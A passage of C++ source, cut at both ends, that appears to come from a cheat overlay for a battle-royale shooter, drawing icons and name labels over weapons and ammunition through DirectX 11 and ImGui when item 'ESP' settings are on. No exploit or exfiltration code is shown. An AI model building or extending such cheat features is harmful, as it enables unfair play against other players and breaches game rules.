															DX11::ImGui_DX11::DrawImage(DX11::M16A4, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::M16A4, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M16A4_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M16A4_Color[0], Setting::Esp_Item_M16A4_Color[1], Setting::Esp_Item_M16A4_Color[2], Setting::Esp_Item_M16A4_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_G36C && Item.Name == u8"G36C")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_G36C_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_G36C_Color[0], Setting::Esp_Item_G36C_Color[1], Setting::Esp_Item_G36C_Color[2], Setting::Esp_Item_G36C_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_QBZ && Item.Name == u8"QBZ")
												{
													if (Setting::Esp_Item_QBZ_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::QBZ, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::QBZ, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_QBZ_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_QBZ_Color[0], Setting::Esp_Item_QBZ_Color[1], Setting::Esp_Item_QBZ_Color[2], Setting::Esp_Item_QBZ_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AUG && Item.Name == u8"AUG")
												{
													if (Setting::Esp_Item_AUG_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::AUG, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::AUG, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AUG_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_QBZ_Color[0], Setting::Esp_Item_QBZ_Color[1], Setting::Esp_Item_QBZ_Color[2], Setting::Esp_Item_QBZ_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_QBU && Item.Name == u8"QBU")
												{
													if (Setting::Esp_Item_QBU_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::QBU, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::QBU, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_QBU_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_QBU_Color[0], Setting::Esp_Item_QBU_Color[1], Setting::Esp_Item_QBU_Color[2], Setting::Esp_Item_QBU_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SLR && Item.Name == u8"SLR")
												{
													if (Setting::Esp_Item_SLR_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SLR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SLR, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SLR_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SLR_Color[0], Setting::Esp_Item_SLR_Color[1], Setting::Esp_Item_SLR_Color[2], Setting::Esp_Item_SLR_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mini14 && Item.Name == u8"Mini-14")
												{
													if (Setting::Esp_Item_Mini14_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Mini14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Mini14, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mini14_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mini14_Color[0], Setting::Esp_Item_Mini14_Color[1], Setting::Esp_Item_Mini14_Color[2], Setting::Esp_Item_Mini14_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SKS && Item.Name == u8"SKS")
												{
													if (Setting::Esp_Item_SKS_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SKS, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SKS, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SKS_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SKS_Color[0], Setting::Esp_Item_SKS_Color[1], Setting::Esp_Item_SKS_Color[2], Setting::Esp_Item_SKS_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_PP19 && Item.Name == u8"PP19")
												{
													if (Setting::Esp_Item_PP19_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::PP19, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::PP19, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_PP19_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_PP19_Color[0], Setting::Esp_Item_PP19_Color[1], Setting::Esp_Item_PP19_Color[2], Setting::Esp_Item_PP19_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P90 && Item.Name == u8"P90")
												{
													if (Setting::Esp_Item_P90_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P90, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P90, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P90_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P90_Color[0], Setting::Esp_Item_P90_Color[1], Setting::Esp_Item_P90_Color[2], Setting::Esp_Item_P90_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_MG3 && Item.Name == u8"MG3")
												{
													if (Setting::Esp_Item_MG3_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::MG3, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::MG3, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_MG3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_MG3_Color[0], Setting::Esp_Item_MG3_Color[1], Setting::Esp_Item_MG3_Color[2], Setting::Esp_Item_MG3_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_HoneyBadger && Item.Name == u8"Honey Badger")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_PP19_Color[0], Setting::Esp_Item_PP19_Color[1], Setting::Esp_Item_PP19_Color[2], Setting::Esp_Item_PP19_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_FAMAS && Item.Name == u8"FAMAS")
												{
													if (Setting::Esp_Item_FAMAS_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::FAMAS, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::FAMAS, Screen.X - 50, Screen.Y - 25, 40, 40);
															continue;
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_PP19_Color[0], Setting::Esp_Item_PP19_Color[1], Setting::Esp_Item_PP19_Color[2], Setting::Esp_Item_PP19_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_Mosin && Item.Name == u8"Mosin")
												{
													if (Setting::Esp_Item_Mosin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mosin_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mosin_Color[0], Setting::Esp_Item_Mosin_Color[1], Setting::Esp_Item_Mosin_Color[2], Setting::Esp_Item_Mosin_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_TommyGun && Item.Name == u8"Tommy Gun")
												{
													if (Setting::Esp_Item_TommyGun_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::TommyGun, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::TommyGun, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_FAMAS_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_FAMAS_Color[0], Setting::Esp_Item_FAMAS_Color[1], Setting::Esp_Item_FAMAS_Color[2], Setting::Esp_Item_FAMAS_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_MP5K && Item.Name == u8"MP5K")
												{
													if (Setting::Esp_Item_MP5K_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::MP5K, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::MP5K, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
														//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_MP5K_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_MP5K_Color[0], Setting::Esp_Item_MP5K_Color[1], Setting::Esp_Item_MP5K_Color[2], Setting::Esp_Item_MP5K_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_UMP9 && Item.Name == u8"UMP9")
												{
													if (Setting::Esp_Item_UMP9_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::UMP9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::UMP9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
												//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_UMP9_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_UMP9_Color[0], Setting::Esp_Item_UMP9_Color[1], Setting::Esp_Item_UMP9_Color[2], Setting::Esp_Item_UMP9_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Vector && Item.Name == u8"Vector")
												{
													if (Setting::Esp_Item_Vector_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Vector, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Vector, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Vector_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Vector_Color[0], Setting::Esp_Item_Vector_Color[1], Setting::Esp_Item_Vector_Color[2], Setting::Esp_Item_Vector_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Uzi && Item.Name == u8"Uzi")
												{
													if (Setting::Esp_Item_Uzi_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Uzi, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Uzi, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Uzi_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Uzi_Color[0], Setting::Esp_Item_Uzi_Color[1], Setting::Esp_Item_Uzi_Color[2], Setting::Esp_Item_Uzi_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_762mm && Item.Name == u8"7.62mm")
												{
													if (Setting::Esp_Item_762mm_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm7, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm7, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_762mm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_762mm_Color[0], Setting::Esp_Item_762mm_Color[1], Setting::Esp_Item_762mm_Color[2], Setting::Esp_Item_762mm_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_556mm && Item.Name == u8"5.56mm")
												{

													if (Setting::Esp_Item_556mm_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm5, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm5, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
														//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_556mm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_556mm_Color[0], Setting::Esp_Item_556mm_Color[1], Setting::Esp_Item_556mm_Color[2], Setting::Esp_Item_556mm_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_9mm && Item.Name == u8"9mm")
												{
													if (Setting::Esp_Item_9mm_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm9, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_9mm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_9mm_Color[0], Setting::Esp_Item_9mm_Color[1], Setting::Esp_Item_9mm_Color[2], Setting::Esp_Item_9mm_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_12Guage && Item.Name == u8"12Guage")
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_12Guage_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_12Guage_Color[0], Setting::Esp_Item_12Guage_Color[1], Setting::Esp_Item_12Guage_Color[2], Setting::Esp_Item_12Guage_Color[3]), true);
													continue;
												}
												if (Setting::Esp_Item_45ACP && Item.Name == u8"45ACP")
												{
													if (Setting::Esp_Item_45ACP_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Amm45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Amm45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
												//	{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_45ACP_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_45ACP_Color[0], Setting::Esp_Item_45ACP_Color[1], Setting::Esp_Item_45ACP_Color[2], Setting::Esp_Item_45ACP_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_DesertEagle && Item.Name == u8"DesertEagle")
												{
													if (Setting::Esp_Item_DesertEagle_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::DesertEagle, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::DesertEagle, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//	else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DesertEagle_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_DesertEagle_Color[0], Setting::Esp_Item_DesertEagle_Color[1], Setting::Esp_Item_DesertEagle_Color[2], Setting::Esp_Item_DesertEagle_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P1911 && Item.Name == u8"P1911")
												{
													if (Setting::Esp_Item_P1911_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P1911, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P1911, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P1911_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P1911_Color[0], Setting::Esp_Item_P1911_Color[1], Setting::Esp_Item_P1911_Color[2], Setting::Esp_Item_P1911_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_R45 && Item.Name == u8"R45")
												{
													if (Setting::Esp_Item_R45_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::R45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::R45, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_R45_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_R45_Color[0], Setting::Esp_Item_R45_Color[1], Setting::Esp_Item_R45_Color[2], Setting::Esp_Item_R45_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P18C && Item.Name == u8"P18C")
												{
													if (Setting::Esp_Item_P18C_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P18C, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P18C, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P18C_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P18C_Color[0], Setting::Esp_Item_P18C_Color[1], Setting::Esp_Item_P18C_Color[2], Setting::Esp_Item_P18C_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_P92 && Item.Name == u8"P92")
												{
													if (Setting::Esp_Item_P92_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::P92, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::P92, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_P92_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_P92_Color[0], Setting::Esp_Item_P92_Color[1], Setting::Esp_Item_P92_Color[2], Setting::Esp_Item_P92_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Vz61 && Item.Name == u8"Vz61")
												{
													if (Setting::Esp_Item_Vz61_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Vz61, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Vz61, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Vz61_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Vz61_Color[0], Setting::Esp_Item_Vz61_Color[1], Setting::Esp_Item_Vz61_Color[2], Setting::Esp_Item_Vz61_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_R1895 && Item.Name == u8"R1895")
												{
													if (Setting::Esp_Item_R1895_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::R1895, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::R1895, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_R1895_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_R1895_Color[0], Setting::Esp_Item_R1895_Color[1], Setting::Esp_Item_R1895_Color[2], Setting::Esp_Item_R1895_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Vertical && Item.Name == u8"AR_Vertical")
												{
													if (Setting::Esp_Item_Vertical_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Vertical, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Vertical, Screen.X - 50, Screen.Y - 25, 40, 40);
															//	continue;
														}
													}
													//else
													//{
